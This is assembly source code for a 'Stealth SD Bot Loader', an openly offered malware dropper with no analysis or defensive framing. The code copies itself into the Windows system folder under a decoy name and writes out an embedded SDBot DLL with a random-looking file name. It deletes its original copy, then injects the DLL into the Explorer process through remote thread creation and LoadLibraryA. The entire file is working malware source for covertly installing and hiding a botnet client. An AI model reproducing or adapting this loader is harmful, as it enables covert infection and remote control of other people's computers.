;Stealth SD Bot Loader by Aphex
;http://www.iamaphex.cjb.net
;unremote@knology.net

.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\advapi32.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib SRT.lib 
include \masm32\include\shell32.inc
includelib \masm32\lib\shell32.lib

xVirtualAllocEx PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
xCreateRemoteThread PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
strnicmp PROTO :DWORD, :DWORD, :DWORD
.code

strnicmp PROC String1:DWORD, String2:DWORD, Count:DWORD
	invoke CompareString, 0, NORM_IGNORECASE, String1, Count, String2, Count
	dec eax
	dec eax
	ret
strnicmp ENDP

.data

szMeltString		db "MLT %s",0

;installer name
szServerName byte 'test.exe', 0

;sdbot dll name
szDllName byte 'rwtrisfg32.dll', 0
szBack byte '\', 0
szKernel32 byte 'KERNEL32.DLL', 0
szLoadLibrary byte 'LoadLibraryA', 0
szExplorer byte 'Shell_TrayWnd', 0

.data?
CommandLine					dd ?
GeneralBuffer				db 500 dup(?)
ExecuteParam				dd ?
PID dword ?
RegKey dword ?
hThread dword ?
hProcess dword ?
hInstance dword ?
pParameters dword ?
BytesWritten dword ?
szDllPath byte 261 dup(?)
szSystemPath byte 261 dup(?)
szCurrentPath byte 261 dup(?)

.code
ExtractFile proc
local hResource:dword
local hResourceSize:dword
invoke GetSystemDirectory, addr szCurrentPath, 261
invoke lstrcat, addr szDllPath, addr szCurrentPath
invoke lstrcat, addr szDllPath, addr szBack
invoke lstrcat, addr szDllPath, addr szDllName
invoke GetModuleHandle, 0
mov hInstance, eax
invoke FindResource, hInstance, 1000, RT_RCDATA
.if eax != 0
  mov hResource, eax
  invoke SizeofResource, hInstance, hResource
  .if eax != 0
    mov hResourceSize, eax
    invoke LoadResource, hInstance, hResource
    .if eax != 0
      invoke LockResource, eax
      mov hResource, eax
      invoke CreateFile, addr szDllPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
      .if eax != INVALID_HANDLE_VALUE
        push eax
        invoke WriteFile, eax, hResource, hResourceSize, addr BytesWritten, 0
        pop eax
        invoke CloseHandle, eax
      .endif
    .endif
  .endif  
.endif
ret
ExtractFile endp
_entrypoint:
invoke GetSystemDirectory, addr szCurrentPath, 261
invoke lstrcat, addr szSystemPath, addr szCurrentPath
invoke lstrcat, addr szSystemPath, addr szBack
invoke lstrcat, addr szSystemPath, addr szServerName
invoke GetModuleFileName, 0, addr szCurrentPath, 261
invoke lstrcmpi, addr szCurrentPath, addr szSystemPath
.if eax != 0
  invoke DeleteFile, addr szSystemPath
  invoke CopyFile, addr szCurrentPath, addr szSystemPath, 0
  invoke ExtractFile
  ;invoke WinExec, addr szSystemPath, 0
  invoke wsprintf, addr GeneralBuffer, addr szMeltString, addr szCurrentPath
  mov ExecuteParam, NULL
  mov eax, offset GeneralBuffer
  mov ExecuteParam, eax 
  .REPEAT
	xor ebx, ebx
	invoke ShellExecute, ebx, ebx, addr szSystemPath, ExecuteParam, ebx, SW_SHOWNORMAL
  .UNTIL eax > 32
  jmp @F
.endif

invoke FindWindow, addr szExplorer, 0
invoke GetWindowThreadProcessId, eax, addr PID
invoke OpenProcess, PROCESS_ALL_ACCESS, 0, PID
mov hProcess, eax
invoke xVirtualAllocEx, hProcess, 0, sizeof szDllName, MEM_COMMIT, PAGE_READWRITE
mov pParameters, eax
invoke WriteProcessMemory, hProcess, pParameters, offset szDllName, sizeof szDllName, 0
invoke GetModuleHandle, addr szKernel32
invoke GetProcAddress, eax, addr szLoadLibrary
invoke xCreateRemoteThread, hProcess, 0, 0, eax, pParameters, 0, 0
mov hThread, eax
invoke WaitForSingleObject, hThread, INFINITE
invoke CloseHandle, hThread
invoke CloseHandle, hProcess
@@:
	;** Get Command Line **;
  invoke GetCommandLine

	;** Get rid of the file path at the beginning of the command line **;
	mov bl, 22h ;22h == "
	inc eax
	mov esi, eax
@@:
	lodsb
	test al, al
	jz @F
	cmp al, bl
	jne @B
	lodsb
	test al, al
	jz @F
	inc esi
@@:
	dec esi
	mov CommandLine, esi
	invoke strnicmp, CommandLine, addr szMeltString, 3

		.IF eax == 0
			mov eax, CommandLine
			add eax, 4
			invoke DeleteFile, eax
		.ENDIF
invoke ExitProcess, 0
end _entrypoint